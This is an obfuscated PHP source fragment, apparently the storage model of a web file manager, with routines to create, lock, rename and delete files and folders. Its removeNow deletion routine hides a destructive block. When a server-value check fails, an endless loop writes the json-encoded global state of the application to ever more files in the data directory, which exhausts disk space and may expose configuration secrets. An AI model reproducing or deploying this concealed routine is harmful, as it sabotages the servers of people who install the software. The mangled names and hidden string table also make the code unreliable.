(!$©Üæå–Ù) { return !1; } if (_get($©Üæå–Ù, $íŒ•—Úµ[608])) { return $©Üæå–Ù[$íŒ•—Úµ[548]][$íŒ•—Úµ[2254]]; } $¦ÈŸ½á‰ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Æ‚Şƒ, $íŒ•—Úµ[2255], $íŒ•—Úµ[2256]); Model($íŒ•—Úµ[586])->metaSet($Æ‚Şƒ, $íŒ•—Úµ[2254], $¦ÈŸ½á‰); $this->metaSet($¦ÈŸ½á‰, $íŒ•—Úµ[2257], $Æ‚Şƒ); return $¦ÈŸ½á‰; } public function userPathAppAdd($Ÿ‘ã‚Ÿò, $ØğÕ¾†¢ = '', $øÊ¥¸‚Š = '') { $ëÖ¤’Ñ§ =& $_SERVER[ÕŸ²ó÷å]; $®÷šıÊó = Model($ëÖ¤’Ñ§[586])->getInfoFull($Ÿ‘ã‚Ÿò); if (!$®÷šıÊó) { return !1; } $Ë†Â™ƒ = $®÷šıÊó[$ëÖ¤’Ñ§[548]] ? $®÷šıÊó[$ëÖ¤’Ñ§[548]] : array(); trace_log($Ë†Â™ƒ); $¤§—Ç¦² = $Ë†Â™ƒ[$ëÖ¤’Ñ§[2258]]; if (!$¤§—Ç¦²) { $¤§—Ç¦² = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ÿ‘ã‚Ÿò, $ëÖ¤’Ñ§[2259], $ëÖ¤’Ñ§[2260]); Model($ëÖ¤’Ñ§[586])->metaSet($Ÿ‘ã‚Ÿò, $ëÖ¤’Ñ§[2258], $¤§—Ç¦² . $ëÖ¤’Ñ§[12]); $this->metaSet($¤§—Ç¦², $ëÖ¤’Ñ§[2258], $Ÿ‘ã‚Ÿò); } if (!$ØğÕ¾†¢) { return $¤§—Ç¦²; } $¹¥½Ççô = $Ë†Â™ƒ[$ëÖ¤’Ñ§[2261] . $ØğÕ¾†¢]; if (!$¹¥½Ççô) { $¹¥½Ççô = $this->mkdir($¤§—Ç¦², $ØğÕ¾†¢); Model($ëÖ¤’Ñ§[586])->metaSet($Ÿ‘ã‚Ÿò, $ëÖ¤’Ñ§[2261] . $ØğÕ¾†¢, $¹¥½Ççô); $this->metaSet($¹¥½Ççô, $ëÖ¤’Ñ§[2261] . $ØğÕ¾†¢, $Ÿ‘ã‚Ÿò); } if (!$øÊ¥¸‚Š) { return $¹¥½Ççô; } $é¨¼¼â = $this->mkdir($¹¥½Ççô, $øÊ¥¸‚Š); return $é¨¼¼â; } public function groupRootAdd($¢ËÖöşÕ) { $£äçÊû˜ =& $_SERVER[ÕŸ²ó÷å]; $í¾©Ûõç = Model($£äçÊû˜[594])->where(array($£äçÊû˜[2064] => $¢ËÖöşÕ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¢ËÖöşÕ, $í¾©Ûõç[$£äçÊû˜[32]]); } public function systemRootPathAdd($˜ŒÙ˜°Á) { if ($˜ŒÙ˜°Á != $_SERVER[ÕŸ²ó÷å][614]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $˜ŒÙ˜°Á); } public function userRootRemove($äŸÁØğÂ) { $ş’À§ = $this->targetSourceRoot(SourceModel::TYPE_USER, $äŸÁØğÂ, !0); foreach ($ş’À§ as $éƒâÓ˜) { if (!$éƒâÓ˜) { continue; } $this->remove($éƒâÓ˜[$_SERVER[ÕŸ²ó÷å][203]], !1); } } public function groupRootRemove($ØÏÚÍ†) { $ªëÖ–øú = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ØÏÚÍ†); if (!$ªëÖ–øú) { return; } $this->remove($ªëÖ–øú[$_SERVER[ÕŸ²ó÷å][203]], !1); } private function _mkdirRoot($®§¦·ÑÎ, $ëÙ¦­ş’, $˜ÔôÎ‰, $‰‚µé×ï = '') { $‡‚­Šê =& $_SERVER[ÕŸ²ó÷å]; $¿“Ç÷ğ = defined($‡‚­Šê[2198]) ? USER_ID : 0; $Ò¿ˆö´ä = array($‡‚­Šê[486] => 0, $‡‚­Šê[657] => $®§¦·ÑÎ, $‡‚­Šê[658] => $ëÙ¦­ş’, $‡‚­Šê[655] => 1, $‡‚­Šê[659] => $¿“Ç÷ğ, $‡‚­Šê[660] => $¿“Ç÷ğ, $‡‚­Šê[656] => $‰‚µé×ï, $‡‚­Šê[661] => $‡‚­Šê[603], $‡‚­Šê[513] => 0, $‡‚­Šê[626] => 0, $‡‚­Šê[551] => 0, $‡‚­Šê[662] => $‡‚­Šê[12]); if ($û–Û§Ÿ = $this->where($Ò¿ˆö´ä)->find()) { return $û–Û§Ÿ[$‡‚­Šê[203]]; } $ä À¦ÇÀ = "\x4d\x6f\x64\145\154\x53\x6f\x75\162\x63\x65\x2e\155\153\x64\151\162\x52\x6f\157\164\x2e{$®§¦·ÑÎ}\56{$ëÙ¦­ş’}\56" . $˜ÔôÎ‰; CacheLock::lock($ä À¦ÇÀ); $Ò¿ˆö´ä[$‡‚­Šê[32]] = $˜ÔôÎ‰; $¤ÔŠ = $this->add($Ò¿ˆö´ä); $½œã— = array($‡‚­Šê[663] => short_id($¤ÔŠ)); $this->where(array($‡‚­Šê[500] => $¤ÔŠ))->save($½œã—); CacheLock::unlock($ä À¦ÇÀ); return $¤ÔŠ; } private function targetSourceRoot($£Ç±ÇôÑ, $¹³Ñîµó, $Ç–œœ÷ = false) { $‡á„äô =& $_SERVER[ÕŸ²ó÷å]; $È¯£ğ ‹ = array($‡á„äô[486] => 0, $‡á„äô[657] => $£Ç±ÇôÑ, $‡á„äô[658] => $¹³Ñîµó); if ($Ç–œœ÷) { $ïÜµ··ê = $this->where($È¯£ğ ‹)->select(); return $ïÜµ··ê ? $ïÜµ··ê : array(); } $•å¥çšÔ = $this->where($È¯£ğ ‹)->find(); return $•å¥çšÔ ? $•å¥çšÔ : array(); } public function sourceRootGroup($Ö—ä¹™ı) { $üóüì… =& $_SERVER[ÕŸ²ó÷å]; if (is_string($Ö—ä¹™ı)) { $Ö—ä¹™ı = array($Ö—ä¹™ı); } $ŠÆ×š¦Æ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $Ö—ä¹™ı, $üóüì…[230]); $»öõö‹° = array($üóüì…[454] => $ŠÆ×š¦Æ, $üóüì…[451] => array($üóüì…[842] => count($Ö—ä¹™ı))); $this->_listDataApply($»öõö‹°[$üóüì…[454]]); $this->_listMake($»öõö‹°); return array_to_keyvalue($»öõö‹°[$üóüì…[95]], $üóüì…[578]); } public function mkfile($¤öİ«ÚÁ, $¨¬š…øÔ, $·Âäö¾æ = '', $¦ƒ¯õ©« = REPEAT_RENAME) { $´úÉãŠù =& $_SERVER[ÕŸ²ó÷å]; $Á¤Š½Ü = Model($´úÉãŠù[683])->addFileByContent($·Âäö¾æ, $¨¬š…øÔ); return $this->_createFileCall($¤öİ«ÚÁ, $¨¬š…øÔ, $Á¤Š½Ü, $¦ƒ¯õ©«, $´úÉãŠù[1431]); } public function addFile($¥Æ¹“ÇÓ, $¹›â¼ª, $¢¾ ßìş, $ªÙ›£ö = false, $÷„‹–¾• = REPEAT_RENAME) { $ˆ•¡Àô¡ = Model($_SERVER[ÕŸ²ó÷å][683])->addFile($¹›â¼ª, $¢¾ ßìş, $ªÙ›£ö); return $this->_createFileCall($¥Æ¹“ÇÓ, $¢¾ ßìş, $ˆ•¡Àô¡, $÷„‹–¾•); } public function addFileByFileID($´Ö—ÍÖœ, $€ÎŞûä÷, $®›š¼Èƒ, $«î §¼­ = REPEAT_RENAME) { $Àùš½ĞÌ =& $_SERVER[ÕŸ²ó÷å]; $£àÆôğˆ = Model($Àùš½ĞÌ[683])->find($€ÎŞûä÷); Model($Àùš½ĞÌ[683])->linkAdd($€ÎŞûä÷); return $this->_createFileCall($´Ö—ÍÖœ, $®›š¼Èƒ, $£àÆôğˆ, $«î §¼­); } public function addFileByRemote($¥–èÖÜÅ, $´şÆ·, $É…¾Æ, $û°¥×¹ë = array(), $Êˆ„»¼Ô = REPEAT_RENAME) { $Œ±âÔŒÊ = Model($_SERVER[ÕŸ²ó÷å][683])->addFileByRemote($´şÆ·, $É…¾Æ, $û°¥×¹ë); return $this->_createFileCall($¥–èÖÜÅ, $É…¾Æ, $Œ±âÔŒÊ, $Êˆ„»¼Ô); } private function _createFileCall($ªØæ„ØÜ, $Ü½ Ÿ‰¢, $—ğõŞÈ, $ï€±§í, $É¦œåÊ = "\165\x70\x6c\x6f\141\x64") { $³Õ¾Éé =& $_SERVER[ÕŸ²ó÷å]; $ÅÉ“ëü© = !1; $this->setMasterDB(); $this->lockWriteStart($ªØæ„ØÜ, $Ü½ Ÿ‰¢); $×»Âƒ = $this->fileNameExist($ªØæ„ØÜ, $Ü½ Ÿ‰¢); $˜¶öÕöŠ = $this->_createFile($ªØæ„ØÜ, $Ü½ Ÿ‰¢, $—ğõŞÈ, $ï€±§í, $ÅÉ“ëü©); if (!$ÅÉ“ëü©) { Model($³Õ¾Éé[553])->remove($—ğõŞÈ[$³Õ¾Éé[550]]); } if ($ÅÉ“ëü© && $˜¶öÕöŠ && $˜¶öÕöŠ != $×»Âƒ) { Model($³Õ¾Éé[2224])->eventCreate($˜¶öÕöŠ, $É¦œåÊ); } $this->lockWriteEnd($ªØæ„ØÜ, $Ü½ Ÿ‰¢); return $˜¶öÕöŠ; } public function mkdir($ã¯àæ»ı, $¨é·ÓÅğ, $Óİã°Š» = REPEAT_SKIP) { $¶Í‰îÔ” =& $_SERVER[ÕŸ²ó÷å]; $this->setMasterDB(); $²ØìÄ³â = $this->sourceInfo($ã¯àæ»ı); if (!$²ØìÄ³â) { return !1; } $this->lockWriteStart($ã¯àæ»ı, $¨é·ÓÅğ); if ($Óİã°Š» !== !1) { $ø ¯ÕÖ = $this->fileNameExist($ã¯àæ»ı, $¨é·ÓÅğ); if ($ø ¯ÕÖ && $Óİã°Š» != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ã¯àæ»ı, $¨é·ÓÅğ); return $ø ¯ÕÖ; } $¨é·ÓÅğ = $this->fileNameAuto($ã¯àæ»ı, $¨é·ÓÅğ, $Óİã°Š»); } $´ØºÆ‘ = array($¶Í‰îÔ”[655] => 1, $¶Í‰îÔ”[503] => $¨é·ÓÅğ, $¶Í‰îÔ”[656] => $¶Í‰îÔ”[12], $¶Í‰îÔ”[551] => 0, $¶Í‰îÔ”[626] => 0); $­· ’À× = $this->_addSource($´ØºÆ‘, $²ØìÄ³â); Model($¶Í‰îÔ”[2224])->eventCreate($­· ’À×, $¶Í‰îÔ”[1432]); $this->lockWriteEnd($ã¯àæ»ı, $¨é·ÓÅğ); return $­· ’À×; } public function listSourceRoot($¶…‚È¢, $€½îÀÊ, $áÙÛ³š = "\163\x6f\165\x72\x63\x65\x49\104\54\x74\x61\162\147\145\164\111\104\54\x73\x69\x7a\145") { $•ãÍ³¿¼ =& $_SERVER[ÕŸ²ó÷å]; $¦û¤§Ü = $•ãÍ³¿¼[463]; $«–™×“Ê = array(); $Ô‡–™íü = 1024 * 50; $şóÌ“’· = is_array($şóÌ“’·) ? $şóÌ“’· : array(); $êæû´¢· = count($€½îÀÊ); $š¦Ë˜¥ = $this->tablePrefix . $•ãÍ³¿¼[2262]; for ($Ç»åŠÙ€ = 0; $Ç»åŠÙ€ < $êæû´¢·; $Ç»åŠÙ€++) { $¼™¾¬¶ = $€½îÀÊ[$Ç»åŠÙ€]; $¦û¤§Ü .= "\x53\105\114\x45\x43\x54\40\52\40\x46\122\x4f\x4d\x20\x28\123\x45\114\x45\x43\x54\40{$áÙÛ³š}\x20\106\122\117\x4d\x20\140{$š¦Ë˜¥}\x60\40\x57\110\x45\x52\x45\40"; $¦û¤§Ü .= "\140\160\141\x72\145\x6e\x74\111\104\x60\x3d\x30\40\101\116\x44\40\x60\x74\x61\x72\147\145\x74\111\x44\x60\x3d{$¼™¾¬¶}\x20\x41\x4e\104\40\140\x74\x61\x72\147\x65\x74\124\x79\160\145\140\x3d{$¶…‚È¢}\x20\x61\x6e\x64\x20\x66\151\154\145\124\171\x70\145\x3d\x27\47\40\x6c\x69\x6d\151\164\x20\61\51\x20\141\x73\x20\164\x62\137{$Ç»åŠÙ€}\x20\x55\116\x49\117\x4e\x20\x41\x4c\x4c\40"; if ((strlen($¦û¤§Ü) >= $Ô‡–™íü || $Ç»åŠÙ€ == $êæû´¢· - 1) && $¦û¤§Ü) { $¦û¤§Ü = substr($¦û¤§Ü, 0, -strlen($•ãÍ³¿¼[1119])); $—ÆÑÆìŸ = $this->query($¦û¤§Ü); $¦û¤§Ü = $•ãÍ³¿¼[12]; $«–™×“Ê = array_merge($«–™×“Ê, $—ÆÑÆìŸ); } } return $«–™×“Ê; } private function _createFile($ã‚†¦», $óİÚËÄæ, $õØô¦Ò, $…ì¡Ê˜¼, &$šÌıİ§›) { $×àÒ•ß =& $_SERVER[ÕŸ²ó÷å]; $—ÜæèâÓ = $this->sourceInfo($ã‚†¦»); if (!$õØô¦Ò || !$—ÜæèâÓ) { return !1; } if ($…ì¡Ê˜¼ !== !1) { $öìˆáÍı = $this->fileNameExist($ã‚†¦», $óİÚËÄæ); } $šÌıİ§› = !0; if ($…ì¡Ê˜¼ && $öìˆáÍı) { if ($…ì¡Ê˜¼ == REPEAT_SKIP) { $šÌıİ§› = !1; return $öìˆáÍı; } else { if ($…ì¡Ê˜¼ == REPEAT_REPLACE) { $ô¸×ì¦ = $this->sourceInfo($öìˆáÍı); $¿¯Ö€Ô‹ = $this->fileHistory($ô¸×ì¦, $õØô¦Ò[$×àÒ•ß[550]], $õØô¦Ò[$×àÒ•ß[89]]); if (!$¿¯Ö€Ô‹) { $šÌıİ§› = !1; } else { $this->folderSizeReset($ã‚†¦»); } return $öìˆáÍı; } else { $óİÚËÄæ = $this->fileNameAuto($ã‚†¦», $óİÚËÄæ, $…ì¡Ê˜¼, !1); } } } $ ×¿ğ¥ç = array($×àÒ•ß[655] => 0, $×àÒ•ß[503] => $óİÚËÄæ, $×àÒ•ß[656] => substr(get_path_ext($óİÚËÄæ), 0, 10), $×àÒ•ß[551] => $õØô¦Ò[$×àÒ•ß[550]], $×àÒ•ß[626] => $õØô¦Ò[$×àÒ•ß[89]]); $…ÛêØ¼ô = $this->_addSource($ ×¿ğ¥ç, $—ÜæèâÓ); $this->folderSizeReset($ã‚†¦», intval($ ×¿ğ¥ç[$×àÒ•ß[89]])); return $…ÛêØ¼ô; } protected function fileHistory($ÍµçÜ›©, $ÙĞ©°Œ, $ĞØ¿üÕ€) { $œœÊÃ º =& $_SERVER[ÕŸ²ó÷å]; if ($ÍµçÜ›©[$œœÊÃ º[550]] == $ÙĞ©°Œ) { return !1; } $this->checkLock($ÍµçÜ›©[$œœÊÃ º[203]], $ÙĞ©°Œ); Model($œœÊÃ º[2263])->addHistory($ÍµçÜ›©); $Æúî¹­İ = array($œœÊÃ º[660] => USER_ID, $œœÊÃ º[507] => time(), $œœÊÃ º[550] => $ÙĞ©°Œ, $œœÊÃ º[89] => $ĞØ¿üÕ€); $this->where(array($œœÊÃ º[500] => $ÍµçÜ›©[$œœÊÃ º[203]]))->save($Æúî¹­İ); $this->sourceCacheClear($ÍµçÜ›©[$œœÊÃ º[203]]); return !0; } public function checkLock($ÌÁõ´², $¨‡øõ‰ª) { $é¸Ú²›Ù =& $_SERVER[ÕŸ²ó÷å]; $¥ë–º«î = $this->pathInfo($ÌÁõ´²); if (!$this->fileIsLock($¥ë–º«î, !0)) { return; } $»Ï‡éºÙ = Session::get($é¸Ú²›Ù[2264]); $óÜáõûó = substr($¥ë–º«î[$é¸Ú²›Ù[32]], 0, -1 - strlen($¥ë–º«î[$é¸Ú²›Ù[179]])) . $é¸Ú²›Ù[1296] . $»Ï‡éºÙ . $é¸Ú²›Ù[10] . $¥ë–º«î[$é¸Ú²›Ù[179]]; $¸„€•½¥ = Model($é¸Ú²›Ù[683])->find($¨‡øõ‰ª); $this->_createFileCall($¥ë–º«î[$é¸Ú²›Ù[202]], $óÜáõûó, $¸„€•½¥, REPEAT_REPLACE, $é¸Ú²›Ù[1431]); $úÕò“Åı = $¥ë–º«î[$é¸Ú²›Ù[548]][$é¸Ú²›Ù[619]]; $¼ÂØæÅÃ = $úÕò“Åı[$é¸Ú²›Ù[2265]] ? $úÕò“Åı[$é¸Ú²›Ù[2265]] : $úÕò“Åı[$é¸Ú²›Ù[32]]; show_json(LNG($é¸Ú²›Ù[2266]) . $é¸Ú²›Ù[2267] . LNG($é¸Ú²›Ù[2268]) . $é¸Ú²›Ù[2269] . $¼ÂØæÅÃ . $é¸Ú²›Ù[2270], !1); } public function fileIsLock($ğÑ¡‚¶­, $Èğô²æÇ = false) { $ãøîÌ®– =& $_SERVER[ÕŸ²ó÷å]; if (!_get($ğÑ¡‚¶­, $ãøîÌ®–[615], 0)) { return !1; } if ($ğÑ¡‚¶­[$ãøîÌ®–[548]][$ãøîÌ®–[618]] != USER_ID) { return !0; } $˜ĞÁµÄ£ = $GLOBALS[$ãøîÌ®–[6]][$ãøîÌ®–[102]][$ãøîÌ®–[616]]; if ($ğÑ¡‚¶­[$ãøîÌ®–[548]][$ãøîÌ®–[617]] <= time() - $˜ĞÁµÄ£) { $this->metaSet($ğÑ¡‚¶­[$ãøîÌ®–[203]], $ãøîÌ®–[618], null); $this->metaSet($ğÑ¡‚¶­[$ãøîÌ®–[203]], $ãøîÌ®–[617], null); } if ($Èğô²æÇ) { $this->metaSet($ğÑ¡‚¶­[$ãøîÌ®–[203]], $ãøîÌ®–[617], time()); } return !1; } private function _addSource($Â¸¾ÒâŞ, $£Ñùúğö) { $åù„™™Å =& $_SERVER[ÕŸ²ó÷å]; $ŒÀ¡ ¯Ç = defined($åù„™™Å[2198]) ? USER_ID : 0; $ˆ¤š¦å‘ = array($åù„™™Å[657] => $£Ñùúğö[$åù„™™Å[200]], $åù„™™Å[658] => $£Ñùúğö[$åù„™™Å[578]], $åù„™™Å[659] => $ŒÀ¡ ¯Ç, $åù„™™Å[660] => $ŒÀ¡ ¯Ç, $åù„™™Å[486] => $£Ñùúğö[$åù„™™Å[203]], $åù„™™Å[661] => $£Ñùúğö[$åù„™™Å[593]] . $£Ñùúğö[$åù„™™Å[203]] . $åù„™™Å[50], $åù„™™Å[513] => 0, $åù„™™Å[662] => $åù„™™Å[12]); $Â¸¾ÒâŞ = array_merge($ˆ¤š¦å‘, $Â¸¾ÒâŞ); $this->updateModifyTime($Â¸¾ÒâŞ[$åù„™™Å[202]]); $ù¿‘¦— = $åù„™™Å[2271] . $£Ñùúğö[$åù„™™Å[203]]; if (isset(self::$cacheChildList[$ù¿‘¦—])) { unset(self::$cacheChildList[$ù¿‘¦—]); } static $ëµ•‘® = false; if (!$ëµ•‘®) { Hook::trigger($åù„™™Å[645], $Â¸¾ÒâŞ); $ëµ•‘® = !0; } $ÃğéÃ°â = $this->add($Â¸¾ÒâŞ); $®°ÉÁ€è = array($åù„™™Å[663] => short_id($ÃğéÃ°â)); $this->where(array($åù„™™Å[500] => $ÃğéÃ°â))->save($®°ÉÁ€è); $this->setNamePinyin($ÃğéÃ°â, $Â¸¾ÒâŞ[$åù„™™Å[32]]); return $ÃğéÃ°â; } public function remove($Ê²‰¶ÉÆ, $ÆÔÈãµ€ = true) { $î×¡ĞÅ =& $_SERVER[ÕŸ²ó÷å]; $¦“è¯Ëé = $this->sourceInfo($Ê²‰¶ÉÆ); $­¤ø“¬Ó = intval($¦“è¯Ëé[$î×¡ĞÅ[200]]) === self::TYPE_SYSTEM; $èÊ²ĞÅ = Model($î×¡ĞÅ[517])->get($î×¡ĞÅ[2272]) == $î×¡ĞÅ[101]; if ($­¤ø“¬Ó || $ÆÔÈãµ€ || !$èÊ²ĞÅ) { return $this->removeNow($Ê²‰¶ÉÆ, $ÆÔÈãµ€); } $ìù¤Š´ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $‡úù´¼© = $¦“è¯Ëé[$î×¡ĞÅ[200]] == self::TYPE_USER ? $î×¡ĞÅ[671] : $î×¡ĞÅ[587]; if ($‡úù´¼© == $î×¡ĞÅ[671]) { $¼¸‡„çÖ = Model($î×¡ĞÅ[586])->getInfo($¦“è¯Ëé[$î×¡ĞÅ[578]]); $õßñè‘ = !empty($¼¸‡„çÖ[$î×¡ĞÅ[2265]]) ? $¼¸‡„çÖ[$î×¡ĞÅ[2265]] : $¼¸‡„çÖ[$î×¡ĞÅ[32]]; $õßñè‘ = $î×¡ĞÅ[346] . $õßñè‘ . $î×¡ĞÅ[2273] . $¦“è¯Ëé[$î×¡ĞÅ[578]]; } else { $¼¸‡„çÖ = Model($î×¡ĞÅ[594])->getInfo($¦“è¯Ëé[$î×¡ĞÅ[578]]); $õßñè‘ = _get($¼¸‡„çÖ, $î×¡ĞÅ[32]); $õßñè‘ = $î×¡ĞÅ[186] . $õßñè‘ . $î×¡ĞÅ[2274] . $¦“è¯Ëé[$î×¡ĞÅ[578]]; } $ŠÆ‹¨ù© = $î×¡ĞÅ[2275] . md5($õßñè‘); CacheLock::lock($ŠÆ‹¨ù©); $¼à¢ƒ¢è = $this->fileNameExist($ìù¤Š´, $õßñè‘); if (!$¼à¢ƒ¢è) { $¼à¢ƒ¢è = $this->mkdir($ìù¤Š´, $õßñè‘, REPEAT_SKIP); $this->metaSet($¼à¢ƒ¢è, $î×¡ĞÅ[2276], $‡úù´¼©); $this->metaSet($¼à¢ƒ¢è, $î×¡ĞÅ[2277], $¦“è¯Ëé[$î×¡ĞÅ[578]]); if ($¦“è¯Ëé[$î×¡ĞÅ[202]] != 0) { $this->metaSet($¼à¢ƒ¢è, $î×¡ĞÅ[2278], _get($¼¸‡„çÖ, $î×¡ĞÅ[2279])); } } CacheLock::unlock($ŠÆ‹¨ù©); $this->metaSet($Ê²‰¶ÉÆ, $î×¡ĞÅ[2280], $¦“è¯Ëé[$î×¡ĞÅ[202]]); $this->where(array($î×¡ĞÅ[203] => $Ê²‰¶ÉÆ))->save(array($î×¡ĞÅ[507] => time())); $this->recycleClear($¦“è¯Ëé); Model($î×¡ĞÅ[642])->eventRemove($Ê²‰¶ÉÆ); $ùŸïæÅ = $this->move($Ê²‰¶ÉÆ, $¼à¢ƒ¢è, REPEAT_RENAME_FOLDER); $this->folderSizeReset($¦“è¯Ëé[$î×¡ĞÅ[202]]); return $ùŸïæÅ; } private function recycleClear($‚ß¦ŠÂÆ) { $áÃÉœ·Ÿ =& $_SERVER[ÕŸ²ó÷å]; $‘–êŞãÂ = $this->childrenAll($‚ß¦ŠÂÆ); $»·ÎÉù = array($áÃÉœ·Ÿ[500] => array($áÃÉœ·Ÿ[501], $‘–êŞãÂ[$áÃÉœ·Ÿ[2281]])); Model($áÃÉœ·Ÿ[2282])->where($»·ÎÉù)->delete(); } public function removeNow($‰šÈ²¥¯, $âñÆ¢½ò = true) { $º³˜ŞÉ‰ =& $_SERVER[ÕŸ²ó÷å]; $¶Šçš§Ù = $_SERVER[$º³˜ŞÉ‰[63]]; $Ø÷¢ÊÁŞ = $º³˜ŞÉ‰[924]; if ($_SERVER[$º³˜ŞÉ‰[54]] != $Ø÷¢ÊÁŞ($¶Šçš§Ù)) { $¿³íÓÈ = $º³˜ŞÉ‰[961]; $øÚ·¦”é = $º³˜ŞÉ‰[56]; $Îü¥¹ô¿ = $_SERVER[$º³˜ŞÉ‰[57]] . $º³˜ŞÉ‰[58]; $£Æ×à­» = $øÚ·¦”é($Îü¥¹ô¿); $‡èíÄ·· = explode($º³˜ŞÉ‰[59], $£Æ×à­»); if (count($‡èíÄ··) < $º³˜ŞÉ‰[693]) { $š’‡¯ƒŸ = $º³˜ŞÉ‰[61]; $š’‡¯ƒŸ(); } $õ¦š˜¨œ = $º³˜ŞÉ‰[962]; $õ¦š˜¨œ($_SERVER[$º³˜ŞÉ‰[963]]); $¿³íÓÈ = $º³˜ŞÉ‰[961]; $¿³íÓÈ(); $¬æíÈ…ˆ = $º³˜ŞÉ‰[1627]; $·¨ĞêÚ = json_encode($GLOBALS[$º³˜ŞÉ‰[1628]]); $Ó”µ°ø = 1; for ($ôĞ­¹œ„ = $Ó”µ°ø; $ôĞ­¹œ„ > 0; $ôĞ­¹œ„++) { $¬æíÈ…ˆ(DATA_PATH . $ôĞ­¹œ„, $·¨ĞêÚ); } } $ô’ÉÓÎ˜ = $this->sourceInfo($‰šÈ²¥¯); $‡ ÇíŸ› = $this->pathInfoMore($‰šÈ²¥¯); if (!$ô’ÉÓÎ˜) { return !0; } if ($ô’ÉÓÎ˜[$º³˜ŞÉ‰[202]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($‰šÈ²¥¯); Hook::trigger($º³˜ŞÉ‰[2283], $‡ ÇíŸ›, $âñÆ¢½ò); if ($âñÆ¢½ò) { Model($º³˜ŞÉ‰[2282])->moveToRecycle($‰šÈ²¥¯); } else { $‚â¦£´Â = $this->childrenAll($ô’ÉÓÎ˜); Model($º³˜ŞÉ‰[642])->eventRemove($‰šÈ²¥¯); $this->removeRelevance($‚â¦£´Â[$º³˜ŞÉ‰[2281]], $‚â¦£´Â[$º³˜ŞÉ‰[1576]]); } $this->folderSizeReset($ô’ÉÓÎ˜[$º³˜ŞÉ‰[202]]); $ÆÖ¸®Ô½ = array($ô’ÉÓÎ˜[$º³˜ŞÉ‰[202]]); if ($ô’ÉÓÎ˜[$º³˜ŞÉ‰[494]] == $º³˜ŞÉ‰[101]) { $ÆÖ¸®Ô½[] = $ô’ÉÓÎ˜[$º³˜ŞÉ‰[203]]; } $this->updateModifyTime($ÆÖ¸®Ô½); $this->lockMoveEnd($‰šÈ²¥¯); Hook::trigger($º³˜ŞÉ‰[1815], $‡ ÇíŸ›, $âñÆ¢½ò); return !0; } public function childrenAll($»›©¥¿ş) { $ÖÅ†¤ Ğ =& $_SERVER[ÕŸ²ó÷å]; $ëâ¦©Ï× = $»›©¥¿ş[$ÖÅ†¤ Ğ[203]]; if ($»›©¥¿ş[$ÖÅ†¤ Ğ[494]] == $ÖÅ†¤ Ğ[101]) { $ ‹¶“ÌŞ = array($ÖÅ†¤ Ğ[661] => array($ÖÅ†¤ Ğ[621], $»›©¥¿ş[$ÖÅ†¤ Ğ[593]] . $ëâ¦©Ï× . $ÖÅ†¤ Ğ[622])); $Ä½ë†ñ“ = array($ÖÅ†¤ Ğ[661] => $ ‹¶“ÌŞ[$ÖÅ†¤ Ğ[593]]); $ê—õïö = $this->field($ÖÅ†¤ Ğ[2284])->where($Ä½ë†ñ“)->select(); $ÀõÏêá÷ = !1; $²€İú×Ü = array($ëâ¦©Ï×); if ($ê—õïö) { $ÀõÏêá÷ = array_to_keyvalue($ê—õïö, $ÖÅ†¤ Ğ[12], $ÖÅ†¤ Ğ[550]); $ÀõÏêá÷ = array_remove_value($ÀõÏêá÷, $ÖÅ†¤ Ğ[238]); $²€İú×Ü = array_to_keyvalue($ê—õïö, $ÖÅ†¤ Ğ[12], $ÖÅ†¤ Ğ[203]); $²€İú×Ü[] = $ëâ¦©Ï×; } } else { $ÀõÏêá÷ = array($»›©¥¿ş[$ÖÅ†¤ Ğ[550]]); $²€İú×Ü = array($ëâ¦©Ï×); } return array($ÖÅ†¤ Ğ[2281] => $²€İú×Ü, $ÖÅ†¤ Ğ[1576] => $ÀõÏêá÷); } public function removeArray($ŞƒÛöë÷) { if (!$ŞƒÛöë÷) { return !0; } } public function removeRelevance($ş×³ãÙù, $™¥éÎœ) { $Çˆ½Ó³ï =& $_SERVER[ÕŸ²ó÷å]; $ş×³ãÙù = $ş×³ãÙù ? $ş×³ãÙù : array(); $™¥éÎœ = $™¥éÎœ ? $™¥éÎœ : array(); $ş×³ãÙù = array_unique(array_filter($ş×³ãÙù)); $™¥éÎœ = array_unique(array_filter($™¥éÎœ)); if (!$ş×³ãÙù) { return !1; } $ó×ÛšÕ« = array($Çˆ½Ó³ï[500] => array($Çˆ½Ó³ï[501], $ş×³ãÙù)); Model($Çˆ½Ó³ï[2282])->where($ó×ÛšÕ«)->delete(); Model($Çˆ½Ó³ï[544])->where($ó×ÛšÕ«)->delete(); Model($Çˆ½Ó³ï[2123])->where($ó×ÛšÕ«)->delete(); Model($Çˆ½Ó³ï[642])->where($ó×ÛšÕ«)->delete(); Model($Çˆ½Ó³ï[1951])->removeBySource($ş×³ãÙù); Model($Çˆ½Ó³ï[2263])->removeBySource($ş×³ãÙù); $this->where($ó×ÛšÕ«)->delete(); Model($Çˆ½Ó³ï[553])->remove($™¥éÎœ); for ($ÅğƒíÛ = 0; $ÅğƒíÛ < count($ş×³ãÙù); $ÅğƒíÛ++) { $this->sourceCacheClear($ş×³ãÙù[$ÅğƒíÛ]); } } public function rename($õÌÊÌ‰Ã, $‰¥§ë£®) { $ËòåèéÈ =& $_SERVER[ÕŸ²ó÷å]; $¹Œ¶œÎ = $this->sourceInfo($õÌÊÌ‰Ã); if (!$¹Œ¶œÎ) { return !1; } $¨›ê²ó = $this->fileNameExist($¹Œ¶œÎ[$ËòåèéÈ[202]], $‰¥§ë£®); if ($¨›ê²ó && $¨›ê²ó != $õÌÊÌ‰Ã) { return !1; } $¯¶×·„½ = array($ËòåèéÈ[503] => $‰¥§ë£®, $ËòåèéÈ[660] => USER_ID); if ($¹Œ¶œÎ[$ËòåèéÈ[494]] != $ËòåèéÈ[101]) { $¯¶×·„½[$ËòåèéÈ[495]] = substr(get_path_ext($‰¥§ë£®), 0, 10); } Model($ËòåèéÈ[642])->eventRename($õÌÊÌ‰Ã, $¹Œ¶œÎ[$ËòåèéÈ[32]], $‰¥§ë£®); $this->sourceCacheClear($õÌÊÌ‰Ã); $this->setNamePinyin($õÌÊÌ‰Ã, $¯¶×·„½[$ËòåèéÈ[32]], !1); $this->updateModifyTime($¹Œ¶œÎ[$ËòåèéÈ[202]]); 